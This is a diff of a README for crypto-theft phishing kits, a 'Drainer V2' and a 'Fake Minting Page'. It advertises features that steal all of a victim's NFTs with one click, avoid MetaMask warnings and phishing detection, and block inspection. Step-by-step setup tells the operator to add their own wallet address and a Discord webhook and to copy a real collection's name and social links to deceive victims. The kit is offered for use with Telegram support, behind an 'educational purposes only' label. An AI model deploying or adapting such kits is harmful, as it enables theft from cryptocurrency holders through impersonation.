@@ -1,66 +1,29 @@
-## `📸 Screenshot :`
-- **Index.html** ![image](https://cdn.discordapp.com/attachments/775727248799694859/1018417368181002260/unknown.png)
-- **Claim.html** ![image](https://cdn.discordapp.com/attachments/775727248799694859/1018417459503562752/unknown.png)
 
-## `📸 Divers :`
-- Copyright symbole : ® / ™ / © 
+# 🖼️ Fake Minting Page by H2ski
 
-## `🗑️ Drainer V2 by H2ski`
+# 🗑️ Udpated 01.09.2022 
 
-- To get instant support, contact me on Telegram **(https://t.me/H2ski)**
+# Screenshot:
+![image](https://cdn.discordapp.com/attachments/775727248799694859/1014852148720320592/unknown.png)
 
--------------------------------------------------------------------------------------------
+# ⚠️ Educational purposes only.
 
-
-## `💡 Features`
-- [x] Inspect Element Detection
-- [x] Custom Design
-- [x] Cool design 
-- [x] Instant ETH/USDT/USDC/BUSD/DAI transactions
-- [x] Set Aproval NFT method
-- [x] Steals all NFT's with one click
-- [x] No contract required
+# 💡 Features
+- [x] Most Simple Fake Minting Page
+- [x] No Red Alert in Metamask
+- [x] Instant ETH transactions
+- [x] Sending ETH method
 - [x] Anti Metamask Phishing Detections
 - [x] Anti F12 Inspect
-- [x] NO BACKDOOR
+- [x] Full Custom Design
+- [x] Original Template
+- [x] No fking Backdoor📎
 
+# Tutorial:
+for using script, please edit **expAddress** & **expInfuraId** in **index.html** and put your **Eth Address** and **Infura Project Id** and thats it.
 
-## `✏️ Setup Guide :` 
+# Q/A:
 
-1. Edit the **settings.js** file. 
-
-# ⚠️ Required fields :
-
-- line 3: **const receiveAddress** = `"PutYourAddressHere";` replace **PutYourAddressHere with your ETH wallet address.**
-- line 36: **const discordWebhookURL** = `"https://discord.com/api/webhooks/lalalalal"` replace this by **Your Discord Webhook Link.**
-
-2. Design Change:
-
-`./Index.html:`
-
-- line 5: Title of The Project                                  "Homepage - **Collection Name**™"
-- line 8: Discord Embed Preview Text                            content=**"Your Description"**
-- line 32: Discord Embed Preview Picture Link in there          content=**"Your Picture Link"**
-- line 51: Title Page                                           "**Collection Name**™"
-- line 55: Description                                          "**Collection Name** ORGANIZE (...)"
-- line 68: Copyright TAG                                        "© 2022 **Collection Name**™"
-- line 71: Discord Link                                         href=**"Real Discord Collection Link"**
-- line 72: Twitter Link                                         href=**"Real Twitter Collection Link"**
-
-
-`./Claim.html:`
-
-- line 5: Title of The Project                                  "Claim Your Prize - **Collection Name**™ Giveaway"
-- line 46: Proposed by "Project Name"                           "⚙️ Proposed by : **Collection Name**™"
-- line 52: Copyright TAG                                        "© 2022 **Collection Name**™"
-- line 55: Discord Link                                         href=**"Real Discord Collection Link"**
-- line 56: Twitter Link                                         href=**"Real Twitter Collection Link"**
-
-`./Assets :`
-
-- backgr0und.png ➜ Background for **Index.html**
-- background.png ➜ Background for **Claim.html**
-- favicon.png ➜ Shortcut Icon
-- preview.gif ➜ Gif Preview for **Claim.html**
-
+Q: How get my Infura project id ?
+A: You can find this information on the site https://infura.io/dashboard , this information can also be called the API KEY.
 
